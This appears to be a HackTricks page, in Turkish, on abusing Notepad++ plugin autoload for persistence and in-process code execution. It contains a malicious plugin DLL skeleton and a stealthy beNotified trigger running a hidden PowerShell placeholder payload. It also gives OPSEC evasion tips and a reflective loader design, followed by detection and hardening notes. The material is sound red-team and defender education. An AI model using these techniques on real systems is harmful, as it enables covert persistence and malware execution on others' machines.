# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++, başlatıldığında `plugins` alt klasörleri altında bulunan **her plugin DLL'sini otomatik olarak yükler**. Herhangi bir **yazılabilir Notepad++ installation** içine kötü amaçlı bir plugin bırakmak, editor her başladığında `notepad++.exe` içinde code execution sağlar; bu da **persistence**, gizli **initial execution** veya editor yükseltilmiş olarak başlatılıyorsa bir **in-process loader** olarak kötüye kullanılabilir.

**Notepad++ 7.6+** sürümünden beri beklenen manuel kurulum düzeni, plugin başına **bir alt klasör** olacak şekildedir (`plugins\<PluginName>\<PluginName>.dll`). **portable mode** içinde (`notepad++.exe` yanında `doLocalConf.xml` bulunması), tüm application tree o dizinin içinde local kalır; bu da çoğu zaman kopyalanmış/admin tool bundle'larını kolayca user-writable bir execution surface'e dönüştürür.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (genellikle yazmak için admin gerektirir).
- Low-privileged operator'lar için yazılabilir seçenekler:
- **portable Notepad++ build**'ini user-writable bir klasörde kullanın.
- `C:\Program Files\Notepad++` klasörünü user-controlled bir path'e kopyalayın (ör. `%LOCALAPPDATA%\npp\`) ve `notepad++.exe`'yi oradan çalıştırın.
- Zaten `doLocalConf.xml` içeren ve `Program Files` dışında duran **admin tool bundle**'larını, çıkarılmış zip kopyalarını veya help-desk toolkit'lerini bulun.
- Her plugin, `plugins` altında kendi alt klasörünü alır ve başlangıçta otomatik olarak yüklenir; menü girdileri **Plugins** altında görünür.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ belirli **exported functions** bekler. Bunların hepsi initialization sırasında çağrılır ve birden fazla execution surface sağlar:
- **`DllMain`** — DLL load olur olmaz çalışır (ilk execution point).
- **`setInfo(NppData)`** — load sırasında bir kez çağrılır ve Notepad++ handles sağlar; genelde menu items kaydetmek için kullanılır.
- **`getName()`** — menüde gösterilen plugin adını döndürür.
- **`getFuncsArray(int *nbF)`** — menu commands döndürür; boş olsa bile startup sırasında çağrılır.
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla eventlerini alır (payload’ları bir user action veya editor event’ine kadar ertelemek için kullanışlıdır).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, daha büyük data exchange’ler için kullanışlıdır.
- **`isUnicode()`** — load sırasında kontrol edilen compatibility flag.

Çoğu export **stub** olarak uygulanabilir; execution, `DllMain` üzerinden veya yukarıdaki herhangi bir callback üzerinden autoload sırasında gerçekleşebilir.

## Minimal malicious plugin skeleton
Beklenen exports ile bir DLL compile edin ve onu writable bir Notepad++ klasörü altında `plugins\\MyNewPlugin\\MyNewPlugin.dll` içine yerleştirin:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL’yi oluşturun (Visual Studio/MinGW).
2. `plugins` altında plugin alt klasörünü oluşturun ve DLL’yi içine bırakın.
3. Notepad++’ı yeniden başlatın; DLL otomatik olarak yüklenir, `DllMain` ve sonraki callbacks çalıştırılır.

## `beNotified` üzerinden düşük gürültülü trigger pattern
OPSEC için, birçok payload **DllMain** içinden çalıştırılmamalıdır. Daha sessiz bir pattern, plugin’in temiz şekilde yüklenmesine izin vermek ve ardından yalnızca **startup complete**, **buffer activation** veya **ilk yazılan karakter** gibi gerçekçi bir editor event’inden sonra çalıştırmaktır.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Bu, gürültülü bir `DllMain` beacon’ından ziyade public offensive research ile daha iyi eşleşir: DLL yine başlangıçta autoload edilir, ancak kötü amaçlı eylem Notepad++ gerçekten kullanılıyormuş gibi görünene kadar ertelenir.

## plugin config directory'yi secondary storage olarak kullanma
Notepad++ `NPPM_GETPLUGINSCONFIGDIR` sağlar; bu, **current user's plugin configuration directory** değerini döndürür. Kötü amaçlı bir plugin, bunu kullanarak disk üzerindeki DLL’i minimal tutabilir; aynı zamanda encrypted config, staged payloads veya tasking dosyalarını normal plugin durumuyla uyumlu görünen bir path içinde saklayabilir.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operasyonel olarak bu, şu durumlarda faydalıdır:
- küçük, autoload edilen bir bootstrap DLL;
- ana plugin binary’sine tekrar dokunmadan kullanıcı bazlı tasking;
- **autoload trigger**’ını daha ağır ikinci aşamadan ayırmak.

## Reflective loader plugin pattern
Silahlandırılmış bir plugin, Notepad++’ı bir **reflective DLL loader**’a dönüştürebilir:
- Minimal bir UI/menu girdisi sunar (örn. "LoadDLL").
- Bir payload DLL almak için bir **file path** veya **URL** kabul eder.
- DLL’yi mevcut process içine reflectively map eder ve exported bir entry point’i çağırır (örn. indirilen DLL içindeki bir loader function).
- Fayda: yeni bir loader başlatmak yerine zararsız görünen bir GUI process’i yeniden kullanır; payload, `notepad++.exe`’nin integrity’sini miras alır (elevated context’ler dahil).
- Trade-offs: disk’e **unsigned plugin DLL** bırakmak gürültülüdür; pratik bir varyasyon, autoload edilen plugin’i yalnızca bir stub olarak kullanmak ve gerçek implant’i başka bir yerde encrypted/staged tutmaktır.

## Detection and hardening notes
- **Notepad++ plugin directories** içine yazmaları engelleyin veya izleyin (user profiles içindeki portable kopyalar dahil); controlled folder access veya application allowlisting etkinleştirin.
- `plugins` altında **new unsigned DLLs** için, portable Notepad++ ağaçlarındaki değişiklikler için ve `notepad++.exe`’den gelen alışılmadık **child processes/network activity** için uyarı oluşturun.
- Meşru plugin’leri baseline edin ve normal Notepad++ plugin interface’ini export eden ancak aynı zamanda shell, PowerShell veya network beacon başlatan herhangi bir yeni DLL’i inceleyin.
- Plugin kurulumunu yalnızca **Plugins Admin** üzerinden zorunlu kılın ve portable kopyaların güvenilmeyen path’lerden çalıştırılmasını kısıtlayın.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
